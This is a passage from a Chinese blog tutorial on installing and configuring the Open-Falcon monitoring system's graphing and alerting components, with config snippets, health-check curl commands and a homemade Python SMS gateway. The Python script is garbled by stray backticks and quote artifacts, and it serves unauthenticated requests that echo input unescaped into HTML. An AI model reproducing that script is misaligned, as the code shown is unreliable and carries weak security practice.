&quot;*.tar.gz&quot;`;do app=`echo $x|cut -d&apos;-&apos; -f2`;mkdir -p $app;tar -zxf $x -C $app; done</span><br></pre></td></tr></table></figure>

<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><h3 id="第一部分：绘图组件安装"><a href="#第一部分：绘图组件安装" class="headerlink" title="第一部分：绘图组件安装"></a><strong>第一部分：绘图组件安装</strong></h3><h5 id="组件列表："><a href="#组件列表：" class="headerlink" title="组件列表："></a><strong>组件列表：</strong></h5><table>
<thead>
<tr>
<th align="center"><strong>组件名称</strong></th>
<th><strong>用途</strong></th>
<th><strong>服务端口</strong></th>
<th><strong>备注</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">Agent</td>
<td>部署在目标机器采集机器监控项</td>
<td>http: 1988</td>
<td></td>
</tr>
<tr>
<td align="center">Transfer</td>
<td>数据接收端，转发数据到后端Graph和Judge</td>
<td>http: 6060 rpc: 8433 socket: 4444</td>
<td></td>
</tr>
<tr>
<td align="center">Graph</td>
<td>操作rrd文件存储监控数据</td>
<td>http: 6070 rpc: 6071</td>
<td>1.可部署多实例做集群 2.需要连接数据库graph</td>
</tr>
<tr>
<td align="center">Query</td>
<td>查询各个Graph数据，提供统一http查询接口</td>
<td>http: 9966</td>
<td></td>
</tr>
<tr>
<td align="center">Dashboard</td>
<td>查询监控历史趋势图的web端</td>
<td>http: 8081</td>
<td>1.需要python虚拟环境 2.需要连接数据库dashborad、graph</td>
</tr>
<tr>
<td align="center">Task</td>
<td>负责一些定时任务，索引全量更新、垃圾索引清理、自身组件监控等</td>
<td>http: 8002</td>
<td>1.需要连接数据库graph</td>
</tr>
</tbody></table>
<h5 id="安装Agent"><a href="#安装Agent" class="headerlink" title="安装Agent"></a><strong>安装Agent</strong></h5><p>agent用于采集机器负载监控指标，比如cpu.idle、load.1min、disk.io.util等等，每隔60秒push给Transfer。agent与Transfer建立了长连接，数据发送速度比较快，agent提供了一个http接口/v1/push用于接收用户手工push的一些数据，然后通过长连接迅速转发给Transfer。</p>
<p>每台机器上，都需要部署agent。修改配置并启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd/opt/openfalcon/agent/</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"></span><br><span class="line">vim cfg.json</span><br><span class="line">修改 transfer这个配置项的enabled为 true，表示开启向transfer发送数据的功能</span><br><span class="line">修改 transfer这个配置项的addr为：[&quot;127.0.0.1:8433&quot;] (改地址为transfer组件的监听地址, 为列表形式，可配置多个transfer实例的地址，用逗号分隔)</span><br><span class="line">#默认情况下（所有组件都在同一台服务器上），保持cfg.json不变即可</span><br><span class="line">#cfg.json中的各配置项，可以参考 https://github.com/open-falcon/agent/blob/master/README.md</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">./control start</span><br><span class="line">#查看日志</span><br><span class="line">./control tail</span><br></pre></td></tr></table></figure>

<h5 id="安装Transfer"><a href="#安装Transfer" class="headerlink" title="安装Transfer"></a><strong>安装Transfer</strong></h5><p>transfer默认监听在:8433端口上，agent会通过jsonrpc的方式来push数据上来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/transfer/</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"># 默认情况下（所有组件都在同一台服务器上），保持cfg.json不变即可</span><br><span class="line"># cfg.json中的各配置项，可以参考 https://github.com/open-falcon/transfer/blob/master/README.md</span><br><span class="line"># 如有必要，请酌情修改cfg.json</span><br><span class="line"></span><br><span class="line"># 启动transfer</span><br><span class="line">./control start</span><br><span class="line"># 校验服务,这里假定服务开启了6060的http监听端口。检验结果为ok表明服务正常启动。</span><br><span class="line">curl -s &quot;http://127.0.0.1:6060/health&quot;</span><br><span class="line">#查看日志</span><br><span class="line">./control tail</span><br></pre></td></tr></table></figure>

<h5 id="安装Graph"><a href="#安装Graph" class="headerlink" title="安装Graph"></a><strong>安装Graph</strong></h5><p>graph组件是存储绘图数据、历史数据的组件。transfer会把接收到的数据，转发给graph。</p>
<p>#创建存储数据目录</p>
<p>mkdir -p /opt/openfalcon/data/6070</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/graph/</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"># 默认情况下（所有组件都在同一台服务器上），绘图数据我改为了/opt/openfalcon/data/6070，还有就是数据库密码需要加上</span><br><span class="line"># cfg.json中的各配置项，可以参考 https://github.com/open-falcon/graph/blob/master/README.md</span><br><span class="line"></span><br><span class="line"># 启动</span><br><span class="line">./control start</span><br><span class="line"># 查看日志</span><br><span class="line">./control tail</span><br><span class="line"># 校验服务,这里假定服务开启了6071的http监听端口。检验结果为ok表明服务正常启动。</span><br><span class="line">curl -s &quot;http://127.0.0.1:6071/health&quot;</span><br></pre></td></tr></table></figure>

<h5 id="安装Query"><a href="#安装Query" class="headerlink" title="安装Query"></a><strong>安装Query</strong></h5><p>query组件，绘图数据的查询接口，query组件收到用户的查询请求后，会从后端的多个graph，查询相应的数据，聚合后，再返回给用户。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd/opt/openfalcon/query/</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"># 默认情况下（所有组件都在同一台服务器上），保持cfg.json不变即可</span><br><span class="line"># cfg.json中的各配置项，可以参考 https://github.com/open-falcon/query/blob/master/README.md</span><br><span class="line"></span><br><span class="line"># 启动</span><br><span class="line">./control start</span><br><span class="line"># 查看日志</span><br><span class="line">./control tail</span><br></pre></td></tr></table></figure>

<h5 id="安装Dashboard"><a href="#安装Dashboard" class="headerlink" title="安装Dashboard"></a><strong>安装Dashboard</strong></h5><p>dashboard是面向用户的查询界面，在这里，用户可以看到push到graph中的所有数据，并查看其趋势图。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#安装依赖和虚拟环境</span><br><span class="line">yum install -y python-virtualenv mysql-devel</span><br><span class="line">cd /opt/openfalcon/dashboard/</span><br><span class="line">virtualenv ./env</span><br><span class="line">./env/bin/pip install -r pip_requirements.txt</span><br><span class="line"></span><br><span class="line">#配置</span><br><span class="line"># config的路径为 $WORKSPACE/dashboard/rrd/config.py，里面有数据库相关的配置信息，如有必要，请修改。默认情况下(所有组件都在同一台服务器上)，保持默认配置即可</span><br><span class="line"># 数据库表结构初始化，请参考前面的 环境准备 阶段</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">./control start</span><br><span class="line">#浏览器访问</span><br><span class="line">http://IP:8081</span><br><span class="line">#查看日志</span><br><span class="line">./control tail</span><br></pre></td></tr></table></figure>

<h5 id="安装Task"><a href="#安装Task" class="headerlink" title="安装Task"></a><strong>安装Task</strong></h5><p>task是监控系统一个必要的辅助模块。定时任务，实现了如下几个功能：</p>
<ul>
<li><p>index更新。包括图表索引的全量更新 和 垃圾索引清理。</p>
</li>
<li><p>falcon服务组件的自身状态数据采集。定时任务了采集了transfer、graph、task这三个服务的内部状态数据。</p>
</li>
<li><p>falcon自检控任务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/task</span><br><span class="line"># #修改配置, 配置项含义见下文</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"></span><br><span class="line"># 默认情况下（所有组件都在同一台服务器上），保持cfg.json不变即可</span><br><span class="line"># cfg.json中的各配置项，可以参考 https://github.com/open-falcon/query/blob/master/README.md</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">./control start</span><br><span class="line"># 校验服务,这里假定服务开启了8002的http监听端口。检验结果为ok表明服务正常启动。</span><br><span class="line">curl -s &quot;127.0.0.1:8002/health&quot;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h3 id="第二部分：报警组件安装"><a href="#第二部分：报警组件安装" class="headerlink" title="第二部分：报警组件安装"></a><strong>第二部分：报警组件安装</strong></h3><h5 id="组件列表：-1"><a href="#组件列表：-1" class="headerlink" title="组件列表："></a><strong>组件列表：</strong></h5><table>
<thead>
<tr>
<th align="center"><strong>组件名称</strong></th>
<th align="center"><strong>用途</strong></th>
<th align="center"><strong>服务端口</strong></th>
<th align="center"><strong>备注</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">Sender</td>
<td align="center">报警发送模块，控制并发度，提供发送的缓冲queue</td>
<td align="center">http: 6066</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">UIC（fe）</td>
<td align="center">用户组管理，单点登录</td>
<td align="center">http: 80</td>
<td align="center">1.需要连接数据库：uic</td>
</tr>
<tr>
<td align="center">Portal</td>
<td align="center">配置报警策略，管理机器分组的web端</td>
<td align="center">http: 5050</td>
<td align="center">1.需要连接数据库：falcon_portal 2.需要python虚拟环境</td>
</tr>
<tr>
<td align="center">HBS</td>
<td align="center">HeartBeat Server，心跳服务器</td>
<td align="center">http: 6031rpc: 6030</td>
<td align="center">1.需要连接数据库：falcon_portal</td>
</tr>
<tr>
<td align="center">Judge</td>
<td align="center">报警判断模块</td>
<td align="center">http: 6081 rpc: 6080</td>
<td align="center">1.可部署多实例</td>
</tr>
<tr>
<td align="center">Links</td>
<td align="center">报警合并依赖的web端，存放报警详情</td>
<td align="center">http: 5090</td>
<td align="center">1.需要连接数据库：falcon_links 2.需要python虚拟环境</td>
</tr>
<tr>
<td align="center">Alarm</td>
<td align="center">报警事件处理器</td>
<td align="center">http: 9912</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">mail-provider</td>
<td align="center">报警邮件http api</td>
<td align="center">http: 4000</td>
<td align="center">小米提供</td>
</tr>
<tr>
<td align="center">sms-provider</td>
<td align="center">报警短信http api</td>
<td align="center">http: 4040</td>
<td align="center">自行编写</td>
</tr>
<tr>
<td align="center">Nodata</td>
<td align="center">检测监控数据的上报异常</td>
<td align="center">http: 6090</td>
<td align="center">1.需要连接数据库：falcon_portal</td>
</tr>
<tr>
<td align="center">Aggregator</td>
<td align="center">集群聚合模块——聚合某集群下的所有机器的某个指标的值，提供一种集群视角的监控体验。</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h5 id="报警准备：mail-provider-amp-sms-provider"><a href="#报警准备：mail-provider-amp-sms-provider" class="headerlink" title="报警准备：mail-provider &amp; sms-provider"></a>报警准备：mail-provider &amp; sms-provider</h5><p>监控系统产生报警事件之后需要发送报警邮件或者报警短信，各个公司可能有自己的邮件服务器，有自己的邮件发送方法；有自己的短信通道，有自己的短信发送方法。falcon为了适配各个公司，在接入方案上做了一个规范，需要各公司提供http的短信和邮件发送接口。</p>
<p>短信发送http接口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">method: post</span><br><span class="line">params:</span><br><span class="line">  - content: 短信内容</span><br><span class="line">  - tos: 使用逗号分隔的多个手机号</span><br></pre></td></tr></table></figure>

<p>falcon将这样调用该接口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url=您公司提供的http短信接口</span><br><span class="line">curl  $url-d&quot;content=xxx&amp;tos=18611112222,18611112223&quot;</span><br></pre></td></tr></table></figure>

<p>邮件发送http接口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">method: post</span><br><span class="line">params:</span><br><span class="line">  - content: 邮件内容</span><br><span class="line">  - subject: 邮件标题</span><br><span class="line">  - tos: 使用逗号分隔的多个邮件地址</span><br></pre></td></tr></table></figure>

<p>falcon将这样调用该接口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url=您公司提供的http邮件接口</span><br><span class="line">curl -X POST $url-d&quot;content=xxx&amp;tos=ulric.qin@gmail.com,user@example.com&amp;subject=xxx&quot;</span><br></pre></td></tr></table></figure>

<h5 id="安装使用mail-provider"><a href="#安装使用mail-provider" class="headerlink" title="安装使用mail-provider"></a><strong>安装使用mail-provider</strong></h5><p>这里使用小米提供的mail-provider，我是通过网友编译好的二级制包安装的，也可自行编译。</p>
<p>github地址： <a href="https://github.com/open-falcon/mail-provider" target="_blank" rel="noopener">https://github.com/open-falcon/mail-provider</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/open-falcon/mail-provider</span><br><span class="line"></span><br><span class="line">tar xf mail-provider-master.tar.gz </span><br><span class="line"></span><br><span class="line">rm -rf mail-provider-master.tar.gz </span><br><span class="line"></span><br><span class="line">mv mail-provider-master mail-provider</span><br><span class="line"></span><br><span class="line">cd mail-provider/</span><br><span class="line"></span><br><span class="line">#修改配置文件cfg.conf</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    &quot;debug&quot;: true,</span><br><span class="line"></span><br><span class="line">    &quot;http&quot;: &#123;</span><br><span class="line"></span><br><span class="line">        &quot;listen&quot;: &quot;0.0.0.0:4000&quot;,</span><br><span class="line"></span><br><span class="line">        &quot;token&quot;: &quot;&quot;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &quot;smtp&quot;: &#123;</span><br><span class="line"></span><br><span class="line">        &quot;addr&quot;: &quot;smtp.exmail.qq.com:25&quot;,</span><br><span class="line"></span><br><span class="line">        &quot;username&quot;: &quot;xxxx@abc.com&quot;,</span><br><span class="line"></span><br><span class="line">        &quot;password&quot;: &quot;12345&quot;,</span><br><span class="line"></span><br><span class="line">        &quot;from&quot;: &quot;xxxx@abc.com&quot;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">#启动</span><br><span class="line">./control start</span><br><span class="line"></span><br><span class="line">#测试邮件接口是否正常，收到邮件证明API 正常。</span><br><span class="line">curl http://127.0.0.1:4000/sender/mail -d &quot;tos=29235373@qq.com&amp;subject=xxxx&amp;content=yyyy&quot;</span><br></pre></td></tr></table></figure>

<h5 id="建立sms-provider"><a href="#建立sms-provider" class="headerlink" title="建立sms-provider"></a>建立sms-provider</h5><p>这里我自己写了个基于python的http server 作为短信接口http api</p>
<p>vim   http_sms.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">‘‘‘</span><br><span class="line">Created on ``2016``-``10``-``17</span><br><span class="line">@author``: chenguomin  qq:``29235373</span><br><span class="line">@explain``: 实现GET方法和POST方法请求</span><br><span class="line">‘‘‘</span><br><span class="line">from`  `BaseHTTPServer ``import` `HTTPServer,BaseHTTPRequestHandler</span><br><span class="line">import` `urllib</span><br><span class="line">import` `urllib2</span><br><span class="line">def` `send_message(tos,txt):</span><br><span class="line">‘‘‘</span><br><span class="line">此函数主要用于调用我公司内部的短信API(get方式)，大伙可自行修改。</span><br><span class="line">比如：需要加用户名密码,MD5，token的自行查看短信平台提供商手册，如何调用短信API。</span><br><span class="line">下面提供一个url供大家参考。</span><br><span class="line">‘‘‘</span><br><span class="line">    ``#url  =  &quot;http://www.sms.com:4000/sendsms?uid=16888&amp;pwd=123456&amp;mobile=%s&amp;msg=%s&quot; % (tos, txt)         </span><br><span class="line">    ``url ``=` `&quot;http://192.168.20.88:8080/SendSms/sendsms?mobile=%s&amp;content=%s&quot;` `%` `(tos, txt)</span><br><span class="line">    ``req ``=` `urllib2.Request(url)</span><br><span class="line">    ``res_data ``=` `urllib2.urlopen(req)</span><br><span class="line">    ``res ``=` `res_data.read()</span><br><span class="line">    ``print` `res</span><br><span class="line">class` `ServerHTTP(BaseHTTPRequestHandler):</span><br><span class="line">    ``def` `do_GET(``self``):</span><br><span class="line">        ``path ``=` `self``.path</span><br><span class="line">        ``print` `path</span><br><span class="line">        ``#拆分url(也可根据拆分的url获取Get提交才数据),可以将不同的path和参数加载不同的html页面，或调用不同的方法返回不同的数据，来实现简单的网站或接口</span><br><span class="line">        ``query ``=` `urllib.splitquery(path)</span><br><span class="line">        ``print` `query</span><br><span class="line">        ``self``.send_response(``200``)</span><br><span class="line">        ``self``.send_header(``&quot;Content-type&quot;``,``&quot;text/html&quot;``)</span><br><span class="line">        ``self``.send_header(``&quot;test&quot;``,``&quot;This is test!&quot;``)</span><br><span class="line">        ``self``.end_headers()</span><br><span class="line">        ``buf ``=` `‘‘‘‘‘&lt;!DOCTYPE HTML&gt;</span><br><span class="line">                ``&lt;html&gt;</span><br><span class="line">                ``&lt;head&gt;&lt;title&gt;Get page&lt;``/``title&gt;&lt;``/``head&gt;</span><br><span class="line">                ``&lt;body&gt;</span><br><span class="line">                ``&lt;form action``=``&quot;post_page&quot;` `method``=``&quot;post&quot;``&gt;</span><br><span class="line">                  ``mobile: &lt;``input` `type``=``&quot;text&quot;` `name``=``&quot;tos&quot;` `/``&gt;&lt;br ``/``&gt;</span><br><span class="line">                  ``content: &lt;``input` `type``=``&quot;text&quot;` `name``=``&quot;content&quot;` `/``&gt;&lt;br ``/``&gt;</span><br><span class="line">                  ``&lt;``input` `type``=``&quot;submit&quot;` `value``=``&quot;POST&quot;` `/``&gt;</span><br><span class="line">                ``&lt;``/``form&gt;</span><br><span class="line">                ``&lt;``/``body&gt;</span><br><span class="line">                ``&lt;``/``html&gt;‘‘‘</span><br><span class="line">        ``self``.wfile.write(buf)</span><br><span class="line">    ``def` `do_POST(``self``):</span><br><span class="line">        ``path ``=` `self``.path</span><br><span class="line">        ``print` `path</span><br><span class="line">        ``#获取post提交的数据</span><br><span class="line">        ``datas ``=` `self``.rfile.read(``int``(``self``.headers[‘content``-``length‘]))</span><br><span class="line">        ``datas ``=` `urllib.unquote(datas).decode(``&quot;utf-8&quot;``, ‘ignore‘)</span><br><span class="line">        ``mobile ``=` `datas.split(‘&amp;‘)[``0``].replace(``&quot;tos=&quot;``,&quot;``&quot;).replace(‘&quot;``‘,‘‘)</span><br><span class="line">        ``content ``=` `datas.split(‘&amp;‘)[``1``].replace(``&quot;content=&quot;``,&quot;``&quot;).replace(‘&quot;``‘,‘‘)</span><br><span class="line">        ``mm ``=` `mobile.split(‘,‘)</span><br><span class="line">        ``for` `i ``in` `mm:</span><br><span class="line">                ``print` `i</span><br><span class="line">                ``send_message(i,content)</span><br><span class="line">                ``self``.send_response(``200``)</span><br><span class="line">                ``self``.end_headers()</span><br><span class="line">                ``buf ``=` `‘‘‘‘‘&lt;!DOCTYPE HTML&gt;</span><br><span class="line">                ``&lt;html&gt;</span><br><span class="line">                ``&lt;head&gt;&lt;title&gt;Post page&lt;``/``title&gt;&lt;``/``head&gt;</span><br><span class="line">                ``&lt;body&gt;Tos:``%``s  &lt;br ``/``&gt;Content:``%``s&lt;``/``body&gt;</span><br><span class="line">                ``&lt;``/``html&gt;‘‘‘``%` `(mobile, content)</span><br><span class="line">                ``self``.wfile.write(buf)</span><br><span class="line">def` `start_server(port):</span><br><span class="line">    ``http_server ``=` `HTTPServer((‘‘, ``int``(port)), ServerHTTP)</span><br><span class="line">    ``http_server.serve_forever()</span><br><span class="line">if` `__name__ ``=``=` `&quot;__main__&quot;``:</span><br><span class="line">    ``#端口可自定义，不冲突就可以，这里设置为：4040</span><br><span class="line">    ``start_server(``4040``)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#运行python http server</span><br><span class="line">nohup python http_sms.py &amp;</span><br><span class="line"></span><br><span class="line">#验证：在浏览器访问，提供了简单的页面测试，只有get，post方法。</span><br><span class="line">http://ip:4040/</span><br><span class="line">#也可以在命令行使用curl测试</span><br><span class="line">curl http://192.168.20.99:4040/ -d &quot;tos=1358888888,1868888888&amp;content=testmsg&quot;</span><br><span class="line">#openfalcon的sender是post方式传递数据给http api的，所以我需要获取sender post过来的tos和content参数，再发送到公司内部的sms api。</span><br></pre></td></tr></table></figure>

<h5 id="安装alarm"><a href="#安装alarm" class="headerlink" title="安装alarm"></a>安装alarm</h5><p>alarm模块是处理报警event的，judge产生的报警event写入redis，alarm从redis读取，这个模块被业务搞得很糟乱，各个公司可以根据自己公司的需求重写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/alarm/</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"></span><br><span class="line"># vi cfg.json</span><br><span class="line"># 把redis配置成与judge同一个</span><br><span class="line">./control start</span><br></pre></td></tr></table></figure>

<p>微信告警版本可到我的github拉取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/chensambb/open-falcon-alarm-by-weixin/</span><br></pre></td></tr></table></figure>

<h5 id="安装sender"><a href="#安装sender" class="headerlink" title="安装sender"></a>安装sender</h5><p>调用各个公司提供的mail-provider和sms-provider，按照某个并发度，从redis中读取邮件、短信并发送，alarm生成的报警短信和报警邮件都是直接写入redis即可，sender来发送。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/sender/</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"></span><br><span class="line"># vi cfg.json</span><br><span class="line"># redis地址需要和后面的alarm、judge使用同一个</span><br><span class="line"># queue维持默认</span><br><span class="line"># worker是最多同时有多少个线程玩命得调用短信、邮件发送接口</span><br><span class="line"># api要给出sms-provider和mail-provider的接口地址</span><br><span class="line"></span><br><span class="line">#我们现在调用上面的短信和邮件api</span><br><span class="line">&#123;</span><br><span class="line">	&quot;debug&quot;: true,</span><br><span class="line">	&quot;http&quot;: &#123;</span><br><span class="line">		&quot;enabled&quot;: true,</span><br><span class="line">		&quot;listen&quot;: &quot;0.0.0.0:6066&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;redis&quot;: &#123;</span><br><span class="line">		&quot;addr&quot;: &quot;127.0.0.1:6379&quot;,</span><br><span class="line">		&quot;maxIdle&quot;: 5</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;queue&quot;: &#123;</span><br><span class="line">		&quot;sms&quot;: &quot;/sms&quot;,</span><br><span class="line">		&quot;mail&quot;: &quot;/mail&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;worker&quot;: &#123;</span><br><span class="line">		&quot;sms&quot;: 10,</span><br><span class="line">		&quot;mail&quot;: 50</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;api&quot;: &#123;</span><br><span class="line">		&quot;sms&quot;: &quot;http://127.0.0.1:4040/&quot;,</span><br><span class="line">		&quot;mail&quot;: &quot;http://127.0.0.1:4000/sender/mail&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">./control start</span><br></pre></td></tr></table></figure>

<h5 id="安装fe"><a href="#安装fe" class="headerlink" title="安装fe"></a>安装fe</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/fe</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"># 请基于cfg.example.json 酌情修改相关配置项</span><br><span class="line"></span><br><span class="line"># 启动</span><br><span class="line">./control start</span><br><span class="line"># 查看日志</span><br><span class="line">./control tail</span><br><span class="line"># 停止服务</span><br><span class="line">./control stop</span><br></pre></td></tr></table></figure>

<h5 id="安装portal"><a href="#安装portal" class="headerlink" title="安装portal"></a>安装portal</h5><p>portal是用于配置报警策略的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y python-virtualenv  # run as root</span><br><span class="line"></span><br><span class="line">cd/opt/openfalcon/portal/</span><br><span class="line">virtualenv ./env</span><br><span class="line"></span><br><span class="line">./env/bin/pip install -r pip_requirements.txt</span><br><span class="line"># vi frame/config.py</span><br><span class="line"># 1. 修改DB配置</span><br><span class="line"># 2. SECRET_KEY设置为一个随机字符串</span><br><span class="line"># 3. UIC_ADDRESS有两个，internal配置为FE模块的内网地址，portal通常是和UIC在一个网段的,内网地址相互访问速度快。external是终端用户通过浏览器访问的UIC地址，很重要！</span><br><span class="line"># 4. 其他配置可以使用默认的</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">./control start</span><br><span class="line">#验证</span><br><span class="line">portal默认监听在5050端口，浏览器访问即可</span><br></pre></td></tr></table></figure>

<h5 id="安装HBS-heartbeat-Server"><a href="#安装HBS-heartbeat-Server" class="headerlink" title="安装HBS(heartbeat Server)"></a>安装HBS(heartbeat Server)</h5><p>心跳服务器，只依赖Portal的DB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  /opt/openfalcon/hbs/</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"></span><br><span class="line"># vi cfg.json </span><br><span class="line">#把数据库配置配置为portal的db</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">./control start</span><br></pre></td></tr></table></figure>

<p>如果先安装的绘图组件又来安装报警组件，那应该已经安装过agent了，hbs启动之后会监听一个http端口，一个rpc端口，agent要和hbs通信，重新去修改agent的配置cfg.json，把heartbeat那项enabled设置为true，并配置上hbs的rpc地址，<code>./control restart</code>重启agent，之后agent就可以和hbs心跳了</p>
<h5 id="安装judge"><a href="#安装judge" class="headerlink" title="安装judge"></a>安装judge</h5><p>报警判断模块，judge依赖于HBS，所以得先搭建HBS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/judge/</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line"># vi cfg.json</span><br><span class="line"># remain: 这个配置指定了judge内存中针对某个数据存多少个点，比如host01这个机器的cpu.idle的值在内存中最多存多少个，</span><br><span class="line"># 配置报警的时候比如all(#3)，这个#后面的数字不能超过remain-1</span><br><span class="line"># hbs: 配置为hbs的地址，interval默认是60s，表示每隔60s从hbs拉取一次策略</span><br><span class="line"># alarm: 报警event写入alarm中配置的redis</span><br><span class="line"># minInterval表示连续两个报警之间至少相隔的秒数，维持默认即可</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">./control start</span><br></pre></td></tr></table></figure>

<h5 id="安装Links"><a href="#安装Links" class="headerlink" title="安装Links"></a>安装Links</h5><p>Links是为报警合并功能写的组件。如果你不想使用报警合并功能，这个组件是无需安装的。</p>
<p>Links个Python的项目，无需像Go的项目那样去做编译。不过Go的项目是静态编译的，编译好了之后二进制无依赖，拿到其他机器也可以跑起来，Python的项目就需要安装一些依赖库了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 我们使用virtualenv来管理Python环境，yum安装需切到root账号</span><br><span class="line"># yum install -y python-virtualenv</span><br><span class="line"></span><br><span class="line">cd /opt/openfalcon/links/</span><br><span class="line">virtualenv ./env</span><br><span class="line"></span><br><span class="line">./env/bin/pip install -r pip_requirements.txt</span><br><span class="line">#安装完依赖的lib之后就可以用control脚本启动了，log在var目录。不过启动之前要先把配置文件修改成相应配置。另外，监听的端口在gunicorn.conf中配置。</span><br><span class="line">#启动</span><br><span class="line">./control start</span><br></pre></td></tr></table></figure>

<h5 id="安装Nodata"><a href="#安装Nodata" class="headerlink" title="安装Nodata"></a>安装Nodata</h5><p>nodata用于检测监控数据的上报异常。nodata和实时报警judge模块协同工作，过程为: 配置了nodata的采集项超时未上报数据，nodata生成一条默认的模拟数据；用户配置相应的报警策略，收到mock数据就产生报警。采集项上报异常检测，作为judge模块的一个必要补充，能够使judge的实时报警功能更加可靠、完善。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/nodata</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line">vim cfg.json</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">./control start</span><br><span class="line"># 校验服务,这里假定服务开启了6090的http监听端口。检验结果为ok表明服务正常启动。</span><br><span class="line">curl -s &quot;127.0.0.1:6090/health&quot;</span><br><span class="line"># 停止服务</span><br><span class="line">./control stop</span><br></pre></td></tr></table></figure>

<h5 id="安装Aggregator"><a href="#安装Aggregator" class="headerlink" title="安装Aggregator"></a>安装Aggregator</h5><p>集群聚合模块。聚合某集群下的所有机器的某个指标的值，提供一种集群视角的监控体验。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /opt/openfalcon/aggregator</span><br><span class="line"># 修改配置, 配置项含义见下文</span><br><span class="line">mv cfg.example.json cfg.json</span><br><span class="line">vim cfg.json</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">./control start</span><br><span class="line"># 校验服务，看端口是否在监听ss -tln</span><br><span class="line"># 检查log</span><br><span class="line">./control tail</span><br><span class="line"># 停止服务</span><br><span class="line">./control stop</span><br></pre></td></tr></table></figure>

<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>参考<a href="http://book.open-falcon.org/zh/usage/index.html" target="_blank" rel="noopener">官方book</a></p>
<h5 id="查看监控数据"><a href="#查看监控数据" class="headerlink" title="查看监控数据"></a>查看监控数据</h5><p>我们说agent只要部署到机器上，并且配置好了heartbeat和transfer就自动采集数据了，我们就可以去dashboard上面搜索监控数据查看了。dashboard是个web项目，浏览器访问之。左侧输入endpoint搜索，endpoint是什么？应该用什么搜索？对于agent采集的数据，endpoint都是机器名，去目标机器上执行<code>hostname</code>，看到的输出就是endpoint，拿着hostname去搜索。</p>
<p>搜索到了吧？嗯，选中前面的复选框，点击“查看counter列表”，可以列出隶属于这个endpoint的counter，counter是什么？<code>counter=${metric}/sorted(${tags})</code></p>
<p>假如我们要查看cpu.idle，在counter搜索框中输入cpu并回车。看到cpu.idle了吧，点击，会看到一个新页面，图表中就是这个机器的cpu.idle的近一小时数据了，想看更长时间的？右上角有个小三角，展开菜单，可以选择更长的时间跨度</p>
<p><img src="/articles/4354c695/4.png" alt></p>
<p><img src="/articles/4354c695/5.png" alt></p>
<h5 id="配置报警策略"><a href="#配置报警策略" class="headerlink" title="配置报警策略"></a>配置报警策略</h5><p>上节我们已经了解到如何查看监控数据了，如果数据达到阈值，比如cpu.idle太小的时候，我们应该如何配置告警呢？</p>
